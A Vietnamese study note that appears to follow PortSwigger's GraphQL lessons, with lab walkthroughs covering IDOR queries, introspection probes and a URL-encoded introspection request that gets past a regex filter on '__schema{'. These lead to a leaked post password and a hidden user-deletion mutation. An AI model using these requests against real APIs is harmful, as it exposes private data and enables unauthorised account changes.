# GraphQL API Vuln
- GraphQL vuln xuất hiện do lỗi thiết kế hay thực hiện. Ví dụ, tính năng xem xét nội quan (introspection feature) để ở trạng thái hoạt động, cho phép atker truy vấn API để thu thập thông tin về lược đồ của nó
- GraphQL atk thường ở dạng request độc mà có thể giúp atker thu thập data hay thực hiện nhưng thao tác không uỷ quyền. Những cuộc atk này có thể có một tác động nghiêm trọng, đặc biệt nếu user có thể chiếm quyền admin bằng cách thao túng truy vấn hay thực thị một CSRF exploit (Client-side Request Forgery). GraphQL API cũng có thể dẫn tới một lỗi lộ thông tin
- Trong phần này sẽ sẽ xem cách để test GraphQL APIs. Đừng lo nếu không biết gì về GraphQL- ta sẽ ghi lại những chi tiết  này. Ta cũng có thể cung cập một vài lab nếu bạn có thể luyện tập những gì được học
# Tìm GraphQL endpoint
- Trước khi bạn có thể kiểm tra một GraphQL API, đầu tiên bạn cần tìm endpoint của nó. Như GraphQL API sử dụng cùng một endpoint cho mọi request, đây là một thông tin cực kì giá trị
> [!NOTE]
> Phần dưới đây hướng dẫn kiểm tra GraphQL endpoint thủ công. Tuy nhiên, Burp Scanner có thể tự động làm điều đó như một phần của scan. Nó đưa ra một "GraphQL endpoint found" nếu có endpoint nào được tìm thấy
- Và tôi đã bỏ qua nó ;))

# Khai thác đối số không rõ ràng (Exploitin unsanitized arguments)
- tại điểm này, bạn có thể bắt đầu tìm vuln. Kiểm tra đối số truy vấn là một cách bắt đầu hợp lí
- Nếu API sử dụng đối số để truy cập vào đối tượng trực tiếp, nó có thể có vuln để truy cập điều khiển vuln. Một user có thể có khả năng truy cập thông tin mà đáng lẽ họ không nên có bằng cách cung cấp đối số tương ứng với thông tin đó. Điều này đôi khi được biết đến như một Insecure direct obj reference (tham chiếu đối tượng trực tiếp không an toàn) - IDOR
- Ví dụ, truy vấn dưới đấy request một sản phẩm cho một online shop

      #Example product query
  
      query {
          products {
              id
              name
              listed
          }
      }
- Danh sách sản phẩm trả về bao gồm chỉ những sản phẩm được list

      #Example product response

      {
          "data": {
              "products": [
                  {
                      "id": 1,
                      "name": "Product 1",
                      "listed": true
                  },
                  {
                      "id": 2,
                      "name": "Product 2",
                      "listed": true
                  },
                  {
                      "id": 4,
                      "name": "Product 4",
                      "listed": true
                  }
              ]
          }
      }
- Từ thông tin này, ta có thể rút ra:
  - Những sản phẩm được phân chia thành các ID
  - Product ID 3 đang không có trong danh sách, có thể là do nó đã bị gỡ khỏi danh sách
- Bằng cách truy vấn ID của sản phẩm bị thiếu, ta có thể có thông tin của nó, mặc dù nó không được list trong shop và đã không được trả về bởi truy vấn gốc

      #Query to get missing product

      query {
        product(id: 3) {
          id
          name
          listed
        }
      }
và trả về:

    #Missing product response

    {
        "data": {
            "product": {
            "id": 3,
            "name": "Product 3",
            "listed": no
            }
        }
    }
# Tìm kiếm lược đồ thông tin
- Bước tiếp theo của API test là ghép các thông tin về các lược đồ cơ bản với nhau
- Con đường tốt nhất để làm điều này là sử dụng truy vấn nội. Introspection (nội quan) là một built-in GraphQL func mà cho phép bạn truy vấn thông tin về lược đồ từ server
- Introspection giúp bạn hiểu cách mà bạn có thể tương tác với một GraphQL API. Nó cũng có thể tiết lộ những thông tin nhạy cảm có tiềm năng, như là disciption field (trường mô tả)
## Sử dụng introspection (nội quan)
- Đây là một cách luyện tập tốt nhất cho introspection để vô hiệu quả môi trương cung cấp, nhưng những điều này không phải lúc nào cũng đúng
- Bạn có thể tìm kiếm introspection sử dụng một truy vấn đơn giản dưới đây. Nếu introspection được bật, response trả về tên của tất cả truy vấn có sẵn

      #Introspection probe request
  
      {
          "query": "{__schema{queryType{name}}}"
      }
> [!NOTE]
> Burp Scanner có thể tự động kiểm tra introspection trong quá trình scan của nó. Nếu nó tìm thấy introspection được bật, nó sẽ thông báo ```GraphQL Introspection enabled```
## Chạy một truy vấn introspection
- Bước tiếp theo là để chạy một introspection đầy đủ chống lại endpoint nên bạncos thể lấy thông tin từ lược đồ cơ bản nhất có thể
- Ví dụ truy vấn dưới đấy trả về đầy đủ chi tiết trong tất cả truy vấn, sự biến đổi, đăng ký, loại hay đoạn

      #Full introspection query
  
      query IntrospectionQuery {
          __schema {
              queryType {
                  name
              }
              mutationType {
                  name
              }
              subscriptionType {
                  name
              }
              types {
               ...FullType
              }
              directives {
                  name
                  description
                  args {
                      ...InputValue
              }
              onOperation  #Often needs to be deleted to run query
              onFragment   #Often needs to be deleted to run query
              onField      #Often needs to be deleted to run query
              }
          }
      }
  
      fragment FullType on __Type {
          kind
          name
          description
          fields(includeDeprecated: true) {
              name
              description
              args {
                  ...InputValue
              }
              type {
                  ...TypeRef
              }
              isDeprecated
              deprecationReason
          }
          inputFields {
              ...InputValue
          }
          interfaces {
              ...TypeRef
          }
          enumValues(includeDeprecated: true) {
              name
              description
              isDeprecated
              deprecationReason
          }
          possibleTypes {
              ...TypeRef
          }
      }
  
      fragment InputValue on __InputValue {
          name
          description
          type {
              ...TypeRef
          }
          defaultValue
      }
  
      fragment TypeRef on __Type {
          kind
          name
          ofType {
              kind
              name
              ofType {
                  kind
                  name
                  ofType {
                      kind
                      name
                  }
              }
          }
      }
> [!NOTE]
> Nếu introspection được bật nhưng truy vấn trên không chạy, hãy thử loại bỏ ```onOperation```, ```onFragment```, và ```onField``` từ cấu trúc truy vấn. Nhiều endpoint không chấp nhận những lệnh này như một phần của truy vấn nội quan, và bạn có thể thành thường với introspection bằng cách loại bỏ chúng
## Trực quna hoá kết quả introspection
- Response tới truy vấn introspection có thể chứa đầy thông tin, nhưng thường rất dài và khó đọc
- Bạn có thể hiện thị mối quan hệ giữa lược đề thực thể dễ dàng hơn bằng cách sử dụng GraphQL visualizer. Đấy là một tool online khiến kết quả truy vấn introspection dễ nhìn hơn, bao gồm cả mỗi quan hệ giữa hoạt đọng và loại
## Sử dung InQL
- Như một bản thể khác để truy vấn introspection thủ công và visualize kết quả, bạn có thể sử dụng Burp Suite's InQL Extension
- InQL là một Burp Suite Extension giúp bạn theo dõi GraphQL APIs một cách an toàn. Khi bạn vượt qua một URL tới nó (bằng cách cung cấp endpoint link trực tiếp hay bằng upload một JSON file), nó đưa ra một truy vấn introspection request tất cả truy vấn và biến đổi, và trình một một structured view để khiến việc xem kết quả dễ dàng hơn
> Để biết thêm về InQL trung Burp, hãy xem tại link [này](https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/working-with-graphql)
## Gựi ý
- Kể cả khi introspection hoàn toàn tắt, bạn vẫn đôi thi có thể sử dụng vài gợi ý để lấy thông tin từ API structure
- Gợi ý là một feature của Apllo GraphQL, mà ở đó server có thể gửi ý sửa đổi truy vấn. Những cái này thường không để nhưng vẫn có thể nhận ra
  - **Ví dụ**: ```There is no entry for 'productInfo'. Ý bạn có phải là 'productInformation' ínteal?)```
- Bạn có thể thu thập được thông tin hữu ích từ điều này, vì response đưa ra các phần hợp lệ của lược đồ một cách hiệu quả
- **Clairvoyance** (Thấu thị) là một tool mà sử dụng gợi ý để tự động phục hồi tất cả các phần của GraphQL, thậm chí khi introspection được tắt. Điều này khiến nó tốn ít thời gian hơn đáng kể để gom thông tin từ suggestion response
- Bạn không thể tắt suggestion trực tiếp trong Apollo
> [!NOTE]
> Burp Scanner có thể tự động kiểm suggestion như một phần của scan. Nếu active suggestion được tìm thấy, nó sẽ report "GraphQL suggestions enabled"
## Lab 1
- Blog page này chứ một blog ẩn với secret pass trong đó. Để hoàn thành lab này, hãy tìm blog đó và nhập pass
- Có thể đọc qua cách sử dụng InQL trước khi làm ở [đây](https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/working-with-graphql)
- Khi truy cập vào trang web và check HTTP history của Burp ta thấy có một request của GraphQL (nếu không thấy thì có thể scan để tìm)
- Check sang response của nó, ta thấy mỗi truy vấn trong {...} sẽ có một ```id``` riếng ở dòng cuối, nhưng lại thiếu mất ```"id":3```, có thể nó đã bị ẩn và việc của chúng ta là tìm ra nó ![image](https://github.com/Myozz/Web_Applications/assets/94811005/2b3dd1ff-c6d9-4016-97b6-8c05ab999d2f)
- Dùng InQL để scan, ta nhận ra truy vấn còn có một trường là ```postPassword``` ![image](https://github.com/Myozz/Web_Applications/assets/94811005/4a838c56-9073-48c0-b859-36ca25b35264) khả năng rất cao là nó dùng để lấy pass
- Chuyển request sang Repeater, và sửa ```id``` thành 3, thêm một trường ```postPassword``` vào truy vấn. Và thế là ta lấy được postPassword ![image](https://github.com/Myozz/Web_Applications/assets/94811005/056f8f87-5940-4ca8-a5c0-d5eea2170d62)
## Lab 2
- Hàm quản lý user cho lab này được hỗ trợ bởi GraphQL endpoint. Lab gồm một access control vuln, bạn có thể khiến API làm lộ thong tin người dùng
- Để giải lab này, đăng nhập với quyền admin và xoá username ```carlos```

# Bypass GraphQL introspection defences
- Nếu bạn không thể truy vấn introspection để chạy API đang test, hãy thử thêm một một kí tự đặc biệt vào sau ```__schema``` keyword
- Khi dev tắt introspection, họ có thể sử dụng một regex (biểu thức chính quy) để xuất ```___schema``` trong truy vấn. Bạn nên thử những kí tự như dấu cách, xuống dòng hay phẩy, vì chúng thường bị GraphQL bỏ quả (nhưng regex thì không)
- Như vậy, nếu dev chỉ xuất ```__schema{```, thì truy vấn introspection bên dưới đây

          #Introspection query with newline
      
          {
              "query": "query{__schema
              {queryType{name}}}"
          }
- Nếu nók hông hoạt động, thử thăm dò một phương thức request khác, vì introspection chỉ có thể bị tắt thông qua POST. Hãy thử dùng GET request, hãy là POST request với một content-type ```x-www-form-urlencoded```
- Ví dụ dưới đấy hiện thị một thăm dò introspection được gửi qua GET, với URL được encode

          # Introspection probe as GET request
      
          GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
- Một cái truy vấn đầy đủ hơn

      /api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
> [!NOTE]
> Nếu một endpoint chỉ chấp nhận truy vấn introspection thông qua GET và bạn muốn phân tích kết quả của truy vấn với InQL, đều tiên bạn cần lưu truy kết quả truy vấn vào một file, sau đó bạn hãy load file này trong InQL, nó sẽ hoạt động như bình thường
## Lab - tìm mọt GraphQL endpoint ẩn
- Hàm quản lý user của lab này được hỗ trợ bởi một GraphQL endpoint ẩn. Bạn sẽ không tìm thấy endpoint theo cách thông thường nữa. Endpoint cũng sẽ có một số biện pháp def introspection
- Để giải lab này, tìm endpoint ẩn và xoá ```carlos```
- Ok ta truy cập vào web và check HTTP history, và không thấy có cái GraphQL nào cả, bởi nó đã bị ẩn
- Nhưng ẩn thì Scanner vẫn cứu dược được :|| Scanner sẽ quét được một vuln ở path ```/api```, và ta có thể sử dụng nó
- Thử send qua repeater rồi request xem sao ![image](https://github.com/Myozz/Web_Applications/assets/94811005/a5d55356-cbcb-4019-8e87-a8c939fc358e)
- Cái trên là do chúng ta chưa truy vấn cái gì, tôi sẽ sửa request thành ```GET /api?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D``` ![image](https://github.com/Myozz/Web_Applications/assets/94811005/f2b06583-2c71-494d-80a2-b0cf42abfe69)
- Để lấy nhiều thông tin hơn thì ta sửa request thành ```/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A``` ![image](https://github.com/Myozz/Web_Applications/assets/94811005/b619a6c3-d187-4bb7-b7d4-2d7293312d48)
- Để ý răng response bây giờ đã có đầy đủ chi tiết introspection. Đây là bởi server được config để xuất truy vấn phù hợp với regex ```"__schema{"```, mà truy vấn đã không còn phù hợp mặc dù vẫn là một introspection query hợp lệ
- Lưu response dưới dạng file json
- Import vào InQL Scanner ![image](https://github.com/Myozz/Web_Applications/assets/94811005/c3952d5a-aef9-4dc0-81fa-275f4f0779ad)
- Send sang repeater nhưng cần phải dùng URL encode để có thể request
- Send request rồi quay lại InQL, check mutation ta thấy có một mutation để xoá user, encode sang url rồi cũng send sáng repeater để request tiếp thôi
